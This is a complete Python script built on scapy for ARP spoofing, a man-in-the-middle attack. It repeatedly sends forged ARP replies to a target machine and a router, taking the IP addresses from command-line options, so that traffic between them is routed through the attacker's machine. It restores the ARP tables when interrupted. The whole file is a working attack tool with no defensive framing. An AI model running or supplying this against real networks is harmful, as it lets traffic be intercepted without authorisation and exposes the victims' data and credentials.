#!usr/bin/env/python

from __future__ import print_function
from sys import stdout
import scapy.all as scapy
import optparse
import time


def get_arguments():
    #parser = argparse.ArgumentParser()
    parser = optparse.OptionParser()
    parser.add_option("-f", "--firstip", dest="first", help="Target IP")
    parser.add_option("-s", "--secondip", dest="second", help="Router to Fool IP")
    (option, argument) = parser.parse_args() # no arguments on argparser only option
    return option


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] #only first element, second is [1] # add unanswered_list

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


packet_sent_count = 0


try:
    while True:
        spoof(get_arguments().first, get_arguments().second)
        spoof(get_arguments().second, get_arguments().first)
        time.sleep(1)
        packet_sent_count = packet_sent_count + 2
        print("\r[+] Packets sent: " + str(packet_sent_count), end="")
        stdout.flush()
except KeyboardInterrupt:
    print("\n[+] CTRL + C detected..... Resetting ARP tables. Please wait!")

    restore(get_arguments().first, get_arguments().second)
    restore(get_arguments().second, get_arguments().first)
